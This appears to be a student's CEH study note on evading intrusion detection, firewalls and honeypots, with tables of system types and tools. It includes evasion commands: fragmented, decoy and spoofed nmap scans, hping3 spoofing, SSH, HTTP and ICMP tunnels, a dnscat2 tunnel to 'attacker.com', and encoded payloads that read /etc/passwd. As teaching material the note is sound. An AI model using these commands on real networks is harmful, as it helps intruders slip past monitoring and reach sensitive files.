# CEH Module 12 — Evading IDS, Firewalls & Honeypots

**Author:** Nivedhitha KS | **Day:** 15 of 60  
**GitHub:** github.com/NivedhithaKS-SEC/cybersec-journey

---

## 1. Intrusion Detection Systems (IDS)

### What is an IDS?
An **Intrusion Detection System** monitors network traffic or host activity for suspicious patterns and generates alerts. It does **NOT block** traffic — it only detects and alerts.

### IDS vs IPS vs Firewall

| System | Function | Blocks Traffic? | Position |
|--------|----------|----------------|---------|
| **Firewall** | Filter traffic by rules (IP, port, protocol) | Yes | Network perimeter |
| **IDS** | Detect suspicious activity, generate alerts | No | Inline or passive tap |
| **IPS** | Detect AND block suspicious activity | Yes | Inline only |

### Types of IDS

#### By Location
| Type | Full Name | What it monitors |
|------|-----------|-----------------|
| **NIDS** | Network IDS | All traffic on a network segment |
| **HIDS** | Host IDS | Activity on a single host (logs, files, processes) |

#### By Detection Method
| Method | How it works | Strengths | Weaknesses |
|--------|-------------|-----------|-----------|
| **Signature-based** | Matches known attack patterns (like antivirus) | Accurate for known attacks | Misses zero-days and obfuscated attacks |
| **Anomaly-based** | Learns normal behaviour, flags deviations | Detects new/unknown attacks | High false positive rate |
| **Heuristic** | Rules-based behaviour analysis | Flexible | Can be confused by legitimate activity |
| **Stateful Protocol** | Tracks full protocol state across packets | Catches multi-packet attacks | Resource intensive |

### Common IDS Tools
| Tool | Type | Notes |
|------|------|-------|
| **Snort** | NIDS | Most widely used open-source IDS |
| **Suricata** | NIDS | Multi-threaded, faster than Snort |
| **OSSEC** | HIDS | Log analysis, file integrity monitoring |
| **Zeek (Bro)** | NIDS | Network analysis framework |

---

## 2. IDS Evasion Techniques

### Technique 1 — Fragmentation
Split a malicious payload across multiple tiny packets. The IDS may not reassemble them before forwarding, so the signature never fully appears.

```bash
# Nmap fragmented scan
nmap -f target_ip                    # Split into 8-byte fragments
nmap -ff target_ip                   # Split into 16-byte fragments
nmap --mtu 8 target_ip              # Custom fragment size (must be multiple of 8)
```

**Why it works:** Many IDS systems process packets individually and don't buffer enough state to reassemble fragmented streams before signature matching.

### Technique 2 — Encryption & Tunneling
Wrap attack traffic inside encrypted protocols. IDS cannot inspect encrypted content without SSL inspection capabilities.

```bash
# SSH tunneling — forward a local port through SSH
ssh -L 8080:internal_host:80 user@pivot_host

# DNS tunneling — hide data in DNS queries
# Tool: iodine, dnscat2
dnscat2 --dns server=attacker.com

# ICMP tunneling — hide data in ping packets
# Tool: ptunnel, icmpsh
```

### Technique 3 — Obfuscation & Encoding
Transform the payload so its signature doesn't match IDS rules.

```bash
# URL encoding
../etc/passwd  →  ..%2Fetc%2Fpasswd  →  ..%252Fetc%252Fpasswd (double encoded)

# Base64 encoding
echo "cat /etc/passwd" | base64
# Output: Y2F0IC9ldGMvcGFzc3dkCg==
# In payload: eval(base64_decode('Y2F0IC9ldGMvcGFzc3dkCg=='))

# Unicode encoding
<script>  →  \u003cscript\u003e

# Hex encoding
/etc/passwd  →  /etc/%70%61%73%73%77%64
```

### Technique 4 — Slow / Low-and-Slow Scans
Spread scan activity over long periods. Rate-based IDS rules have thresholds (e.g., "alert if >100 SYN packets/second") — slow scans stay below those thresholds.

```bash
# Nmap timing templates
nmap -T0 target    # Paranoid — 5 min between probes (evades most IDS)
nmap -T1 target    # Sneaky — 15 sec between probes
nmap -T2 target    # Polite — 0.4 sec between probes
nmap -T3 target    # Normal (default)
nmap -T4 target    # Aggressive
nmap -T5 target    # Insane — fastest, very detectable
```

### Technique 5 — Decoy Scans
Flood the IDS with scan traffic from fake (spoofed) source IPs alongside your real scan. The IDS logs thousands of "attackers" and your real IP is hidden in the noise.

```bash
nmap -D RND:10 target_ip            # 10 random decoy IPs
nmap -D 192.168.1.1,192.168.1.2,ME target_ip  # Specific decoys + your real IP
nmap -S spoofed_source_ip target_ip  # Fully spoof source IP (need raw socket privs)
```

### Technique 6 — Protocol-Level Manipulation
```bash
nmap --data-length 25 target_ip     # Append 25 random bytes to packets
nmap --badsum target_ip             # Send packets with bad checksums
nmap --ip-options "L 192.168.1.1" target_ip  # Loose source routing

# Session splicing — Nmap does this via fragmentation
# Purpose: Split TCP session data to confuse stateful IDS
```

### Technique 7 — Polymorphic Shellcode
Shellcode that changes its byte sequence every execution but produces the same result. The IDS signature matches a fixed byte pattern — polymorphic code never has the same pattern twice.

---

## 3. Firewall Types & Evasion

### Types of Firewalls

| Type | How it works | Layer |
|------|-------------|-------|
| **Packet filter** | Checks IP, port, protocol headers only | L3/L4 |
| **Stateful inspection** | Tracks connection state (SYN/ACK tracking) | L4 |
| **Application layer (WAF)** | Inspects content of HTTP/HTTPS traffic | L7 |
| **Next-gen (NGFW)** | Deep packet inspection + app awareness | L3–L7 |
| **Circuit-level gateway** | Validates TCP handshake only | L5 |

### Firewall Evasion Techniques

#### Port Manipulation
Run services on firewall-allowed ports. A web shell on port 80 looks like normal web traffic.
```bash
# Run SSH on port 443 (HTTPS port — usually allowed)
# /etc/ssh/sshd_config: Port 443
ssh -p 443 user@target.com
```

#### IP Spoofing
```bash
# Forge source IP in packet headers
# Requires raw socket access (root/admin)
hping3 -a 192.168.1.100 -S -p 80 target_ip   # Spoof source as 192.168.1.100
```

#### Firewalking
Determine which ports/protocols are allowed through a firewall without connecting to the target directly.
```bash
# Firewalking technique — uses TTL manipulation
# Tool: firewalk
firewalk -S1-1024 -i eth0 gateway_ip target_ip
```

#### HTTP Tunneling
Wrap non-HTTP traffic inside HTTP requests to pass through firewalls that only allow HTTP/HTTPS.
```bash
# Tool: HTTPTunnel
htc --forward-port 8888 target:22    # Tunnel SSH through HTTP
```

#### ICMP Tunneling
```bash
# Tools: ptunnel, icmpsh
# Attacker listens:
ptunnel -x password

# Victim connects:
ptunnel -p attacker_ip -lp 8000 -da 192.168.1.1 -dp 22 -x password
```

---

## 4. Honeypots

### What is a Honeypot?
A **honeypot** is a deliberately vulnerable decoy system designed to attract attackers, log their activities, and waste their time — while protecting real systems.

### Types of Honeypots

| Type | Description | Use case |
|------|-------------|---------|
| **Low-interaction** | Simulates services/responses only | Easy to deploy, logs basic attacks |
| **High-interaction** | Full real OS with real services | Captures sophisticated attacks, risky |
| **Production honeypot** | Deployed inside real network | Early warning system |
| **Research honeypot** | Deployed to study attack techniques | Academic/security research |
| **Honeypot farm / Honeynet** | Multiple honeypots networked together | Large-scale attacker analysis |

### Common Honeypot Tools

| Tool | Type | Notes |
|------|------|-------|
| **Honeyd** | Low-interaction NIDS | Simulates many OS types simultaneously |
| **Kippo/Cowrie** | SSH honeypot | Logs all SSH brute force + commands |
| **Glastopf** | Web app honeypot | Simulates vulnerable web app |
| **Dionaea** | Malware capture | Captures malware samples |
| **Canary Tokens** | Tripwire tokens | Tracks if files/links are accessed |

### How Attackers Detect Honeypots
1. **Latency analysis** — Real systems have variable latency; honeypots often respond too consistently
2. **Limited interaction depth** — Low-interaction honeypots fail on unusual protocol requests
3. **Known Honeyd signatures** — Nmap has OS detection; Honeyd responses have identifiable fingerprints
4. **No real user activity** — No bash history, no recent file modifications, no users logged in
5. **Too many open ports** — Real servers don't have every service running
6. **Virtual machine artefacts** — VMware/VirtualBox MAC prefixes, specific registry keys

```bash
# Check for Honeyd signature
nmap -O target_ip              # OS detection — Honeyd returns unusual combinations
nmap --script=banner target_ip  # Check banner responses for inconsistencies

# Check for VM (potential honeypot indicator)
# MAC prefixes:
# 00:0C:29 = VMware
# 08:00:27 = VirtualBox
# 00:50:56 = VMware ESXi
arp -a | grep target_ip
```

---

## 5. Key CEH Exam Points

| Concept | Key fact |
|---------|---------|
| IDS vs IPS | IDS detects only; IPS detects + blocks |
| NIDS placement | Behind the firewall, before the internal network |
| Signature-based IDS weakness | Cannot detect zero-day attacks |
| Anomaly-based IDS weakness | High false positive rate |
| Best fragmentation tool | Fragroute |
| Snort rule format | `alert tcp any any -> any 80 (msg:"HTTP";)` |
| Honeypot legal note | Attackers can claim entrapment in some jurisdictions |
| Session splicing | Sends partial HTTP requests to evade pattern matching |

---

## 6. Quick Reference Commands

```bash
# IDS Evasion with Nmap
nmap -f target                       # Fragment packets
nmap --mtu 8 target                  # Custom MTU
nmap -D RND:10 target                # Decoy scan
nmap -T0 target                      # Paranoid timing
nmap --data-length 50 target         # Append random data
nmap -S spoofed_ip -e eth0 target    # Source IP spoof

# Tunneling
ssh -L local_port:dest_host:dest_port user@pivot   # SSH local forward
ssh -R remote_port:dest_host:dest_port user@pivot  # SSH remote forward
ssh -D 9050 user@proxy_host                        # SOCKS proxy via SSH

# Check firewall rules (on compromised Linux host)
iptables -L -n -v
ufw status verbose
```

---

*Day 15 — 60-Day Cybersecurity Journey | github.com/NivedhithaKS-SEC/cybersec-journey*
